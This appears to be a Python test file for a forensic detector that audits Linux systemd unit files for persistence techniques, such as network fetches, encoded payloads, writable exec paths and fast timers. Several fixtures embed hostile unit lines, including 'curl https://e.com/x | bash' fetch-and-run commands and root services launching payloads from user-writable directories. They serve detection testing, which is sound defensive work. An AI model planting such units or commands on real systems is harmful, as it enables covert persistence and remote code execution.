"""Linux systemd unit deep-audit detector tests + the matching
collector's system-unit text capture."""

from __future__ import annotations

import os

from digger.collectors.linux.systemd import SystemdCollector
from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.systemd_audit import (
    SystemdAuditDetector,
    _exec_basename,
    _looks_writable,
    _parse_timer_seconds,
)


def _make_unit_artifact(path, contents, *, subject_prefix="user-unit",
                          owner_uid=1000):
    return Artifact(
        collector="linux.systemd",
        category="persistence",
        subject=f"{subject_prefix}:{path}",
        data={
            "path": path,
            "owner_uid": owner_uid,
            "size": len(contents),
            "mtime": 1000.0,
            "contents": contents,
            "mitre": "T1543.002",
        },
    )


def _seed(store, path, contents, *, owner_uid=1000):
    store.add_artifact(_make_unit_artifact(
        path, contents, subject_prefix="user-unit", owner_uid=owner_uid,
    ))


def _seed_system(store, path, contents, *, owner_uid=0):
    store.add_artifact(_make_unit_artifact(
        path, contents, subject_prefix="system-unit", owner_uid=owner_uid,
    ))


# ---- helpers ---- #


def test_looks_writable_home():
    assert _looks_writable("/home/alice/x.sh") is True
    assert _looks_writable("/root/.cache/y") is True
    assert _looks_writable("/tmp/z") is True


def test_looks_writable_safe_paths():
    assert _looks_writable("/usr/bin/myapp") is False
    assert _looks_writable("/opt/foo/bar") is False


def test_looks_writable_empty():
    assert _looks_writable("") is False


def test_exec_basename_simple():
    assert _exec_basename("/bin/sh /tmp/x.sh") == "sh"


def test_exec_basename_with_modifier():
    """systemd allows +/-/@/! prefix modifiers on Exec lines."""
    assert _exec_basename("-/usr/bin/python3 /opt/x.py") == "python3"
    assert _exec_basename("@/bin/bash") == "bash"


def test_exec_basename_no_path():
    assert _exec_basename("ruby /x.rb") == "ruby"


def test_parse_timer_seconds_plain():
    assert _parse_timer_seconds("30") == 30
    assert _parse_timer_seconds("30s") == 30


def test_parse_timer_seconds_minutes():
    assert _parse_timer_seconds("5min") == 300
    assert _parse_timer_seconds("2m") == 120


def test_parse_timer_seconds_hours():
    assert _parse_timer_seconds("2h") == 7200
    assert _parse_timer_seconds("3hour") == 10800


def test_parse_timer_seconds_invalid():
    assert _parse_timer_seconds("garbage") is None
    assert _parse_timer_seconds("") is None


# ---- detector: scope ---- #


def test_detector_ignores_directory_listing_and_systemctl_dump(tmp_path):
    """Directory-listing and systemctl-output artifacts don't carry
    unit text — out of scope."""
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(Artifact(
            collector="linux.systemd",
            category="persistence",
            subject="unit-dir:/etc/systemd/system",
            data={"path": "/etc/systemd/system",
                   "count": 12, "entries": []},
        ))
        store.add_artifact(Artifact(
            collector="linux.systemd",
            category="persistence",
            subject="list-units",
            data={"raw": "output of systemctl list-units"},
        ))
        assert list(SystemdAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_audits_system_unit_artifacts(tmp_path):
    """system-unit:* artifacts (from /etc/systemd/system /
    /run/systemd/system) get the same deep audit as user-unit:*."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_system(
            store,
            "/etc/systemd/system/x.service",
            "[Service]\nUser=root\n"
            "ExecStart=/bin/sh -c \"curl https://e.com/x | bash\"\n",
        )
        findings = list(SystemdAuditDetector().detect(store))
        kinds = {f.evidence.get("kind") for f in findings}
        assert "systemd_network_fetch" in kinds
    finally:
        store.close()


def test_detector_returns_no_findings_on_empty_store(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        assert list(SystemdAuditDetector().detect(store)) == []
    finally:
        store.close()


# ---- U1 network fetch ---- #


def test_u1_curl_in_execstart_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\n"
              "ExecStart=/bin/sh -c \"curl -o /tmp/x https://e.com/x\"\n"
              "[Install]\nWantedBy=default.target\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_u1_pipe_to_shell_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\n"
              "ExecStart=/bin/sh -c \"curl https://e.com/x | bash\"\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "critical"
        assert f[0].evidence["pipe_to_shell"] is True
    finally:
        store.close()


def test_u1_python_socket_import(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\n"
              "ExecStart=/usr/bin/python3 -c \"import socket; ...\"\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_network_fetch"]
        assert len(f) == 1
    finally:
        store.close()


def test_u1_no_finding_for_clean_unit(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/usr/bin/myapp --serve\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "systemd_network_fetch"]
    finally:
        store.close()


# ---- U2 encoded payload ---- #


def test_u2_base64_payload_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        big_b64 = "A" * 200
        _seed(store, "/home/u/.config/systemd/user/x.service",
              f"[Service]\nExecStart=/bin/sh -c \"echo {big_b64}\"\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_encoded_payload"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


def test_u2_no_finding_for_short_base64(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/bin/sh -c \"echo AAAA\"\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "systemd_encoded_payload"]
    finally:
        store.close()


# ---- U3 interpreter + Restart ---- #


def test_u3_interpreter_restart_always_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\n"
              "ExecStart=/bin/bash /home/u/loop.sh\n"
              "Restart=always\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_interpreter_respawn"]
        assert len(f) == 1
        assert f[0].severity == "high"
        assert f[0].evidence["restart_mode"] == "always"
    finally:
        store.close()


def test_u3_python_restart_on_failure_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\n"
              "ExecStart=/usr/bin/python3 /home/u/agent.py\n"
              "Restart=on-failure\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_interpreter_respawn"]
        assert len(f) == 1
    finally:
        store.close()


def test_u3_no_finding_without_restart(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/bin/bash /home/u/once.sh\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "systemd_interpreter_respawn"]
    finally:
        store.close()


def test_u3_no_finding_for_binary_program(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\n"
              "ExecStart=/usr/local/bin/myapp\nRestart=always\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "systemd_interpreter_respawn"]
    finally:
        store.close()


# ---- U4 writable + auto-enabled ---- #


def test_u4_writable_exec_wantedby_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/home/u/.cache/payload\n"
              "[Install]\nWantedBy=default.target\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_writable_autoenabled"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_u4_no_finding_without_install_section(tmp_path):
    """ExecStart from writable path BUT no auto-enable — U4 doesn't fire."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/home/u/.cache/payload\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "systemd_writable_autoenabled"]
    finally:
        store.close()


def test_u4_no_finding_for_safe_exec_path(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/usr/bin/myapp\n"
              "[Install]\nWantedBy=default.target\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "systemd_writable_autoenabled"]
    finally:
        store.close()


# ---- U5 root + writable ---- #


def test_u5_root_writable_exec_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nUser=root\n"
              "ExecStart=/home/u/payload.sh\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_root_writable_exec"]
        assert len(f) == 1
        assert f[0].severity == "critical"
    finally:
        store.close()


def test_u5_no_finding_for_non_root(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nUser=alice\n"
              "ExecStart=/home/u/payload.sh\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "systemd_root_writable_exec"]
    finally:
        store.close()


# ---- U6 writable EnvironmentFile ---- #


def test_u6_writable_envfile_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/usr/bin/x\n"
              "EnvironmentFile=/home/u/.cache/env\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_writable_envfile"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


def test_u6_writable_loadcredential_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/usr/bin/x\n"
              "LoadCredentialEncrypted=cred:/home/u/.cache/cred\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_writable_envfile"]
        assert len(f) == 1
    finally:
        store.close()


def test_u6_no_finding_for_safe_envfile(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nExecStart=/usr/bin/x\n"
              "EnvironmentFile=/etc/myapp/env\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "systemd_writable_envfile"]
    finally:
        store.close()


# ---- U7 suspicious timer cadence ---- #


def test_u7_sub_minute_timer_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.timer",
              "[Timer]\nOnUnitActiveSec=30s\n")
        findings = list(SystemdAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "systemd_suspicious_timer"]
        assert len(f) == 1
        assert f[0].severity == "medium"
        assert f[0].evidence["on_unit_active_sec_s"] == 30
    finally:
        store.close()


def test_u7_no_finding_for_normal_cadence(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.timer",
              "[Timer]\nOnUnitActiveSec=1h\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "systemd_suspicious_timer"]
    finally:
        store.close()


def test_u7_no_finding_for_unparseable_value(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.timer",
              "[Timer]\nOnUnitActiveSec=garbage\n")
        findings = list(SystemdAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "systemd_suspicious_timer"]
    finally:
        store.close()


# ---- stacking ---- #


def test_multiple_findings_per_unit(tmp_path):
    """One bad unit can trip multiple layers."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/systemd/user/x.service",
              "[Service]\nUser=root\n"
              "ExecStart=/home/u/.cache/payload.sh\n"
              "ExecStartPre=/bin/sh -c \"curl https://e.com/x | sh\"\n"
              "Restart=always\n"
              "[Install]\nWantedBy=default.target\n")
        findings = list(SystemdAuditDetector().detect(store))
        kinds = {f.evidence.get("kind") for f in findings}
        # U1 (curl|sh in ExecStartPre), U4 (writable+autoenabled),
        # U5 (root+writable), U3 doesn't fire because /home/u/.cache/payload.sh
        # basename "payload.sh" isn't in the interpreter set
        assert "systemd_network_fetch" in kinds
        assert "systemd_writable_autoenabled" in kinds
        assert "systemd_root_writable_exec" in kinds
    finally:
        store.close()


# ---- registration ---- #


def test_detector_registered_in_all_detectors():
    from digger.detectors import all_detectors
    names = {d.name for d in all_detectors()}
    assert "systemd_audit" in names


def test_detector_sigma_template_has_persistence_tags():
    det = SystemdAuditDetector()
    tpl = det.to_sigma_template()
    assert tpl["id"] == "digger-systemd-audit-template"
    assert "attack.t1543.002" in tpl["tags"]
    assert tpl["logsource"]["product"] == "linux"


# ---- collector: system-unit text capture ---- #


def test_collector_emits_system_unit_for_etc_systemd(tmp_path,
                                                      monkeypatch):
    fake_etc = tmp_path / "etc-systemd-system"
    fake_etc.mkdir()
    unit = fake_etc / "myservice.service"
    unit.write_text(
        "[Service]\nExecStart=/usr/bin/myservice\n"
        "[Install]\nWantedBy=multi-user.target\n"
    )

    monkeypatch.setattr(
        "digger.collectors.linux.systemd._DEEP_AUDIT_SYSTEM_DIRS",
        [str(fake_etc)],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd._UNIT_DIRS",
        [],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd._user_unit_dirs",
        lambda: [],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd.shutil.which",
        lambda name: None,
    )

    arts = list(SystemdCollector().collect())
    system_units = [a for a in arts
                    if a.subject.startswith("system-unit:")]
    assert len(system_units) == 1
    assert "myservice.service" in system_units[0].subject
    assert "ExecStart=/usr/bin/myservice" in \
        system_units[0].data["contents"]


def test_collector_skips_symlinks_under_etc_systemd(tmp_path,
                                                     monkeypatch):
    """Symlinks under /etc/systemd/system are typically vendor-shipped
    units (/usr/lib/systemd/system/* aliased). Skip them — the
    dir-listing artifact already captured them by name."""
    fake_etc = tmp_path / "etc-systemd-system"
    fake_etc.mkdir()
    target = tmp_path / "elsewhere.service"
    target.write_text("[Service]\nExecStart=/x\n")
    link = fake_etc / "linked.service"
    try:
        os.symlink(target, link)
    except (OSError, NotImplementedError):
        return   # filesystem doesn't support symlinks

    real = fake_etc / "real.service"
    real.write_text("[Service]\nExecStart=/y\n")

    monkeypatch.setattr(
        "digger.collectors.linux.systemd._DEEP_AUDIT_SYSTEM_DIRS",
        [str(fake_etc)],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd._UNIT_DIRS", [],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd._user_unit_dirs",
        lambda: [],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd.shutil.which",
        lambda name: None,
    )

    arts = list(SystemdCollector().collect())
    system_units = [a for a in arts
                    if a.subject.startswith("system-unit:")]
    names = {a.subject.split("/")[-1] for a in system_units}
    assert "real.service" in names
    assert "linked.service" not in names


def test_collector_covers_timer_and_path_units(tmp_path,
                                                 monkeypatch):
    fake_etc = tmp_path / "etc-systemd-system"
    fake_etc.mkdir()
    (fake_etc / "x.service").write_text("[Service]\nExecStart=/a\n")
    (fake_etc / "y.timer").write_text(
        "[Timer]\nOnUnitActiveSec=1h\n",
    )
    (fake_etc / "z.path").write_text(
        "[Path]\nPathChanged=/etc/passwd\n",
    )
    (fake_etc / "ignore.txt").write_text("not a unit")

    monkeypatch.setattr(
        "digger.collectors.linux.systemd._DEEP_AUDIT_SYSTEM_DIRS",
        [str(fake_etc)],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd._UNIT_DIRS", [],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd._user_unit_dirs",
        lambda: [],
    )
    monkeypatch.setattr(
        "digger.collectors.linux.systemd.shutil.which",
        lambda name: None,
    )

    arts = list(SystemdCollector().collect())
    names = {a.subject.split("/")[-1]
             for a in arts
             if a.subject.startswith("system-unit:")}
    assert names == {"x.service", "y.timer", "z.path"}
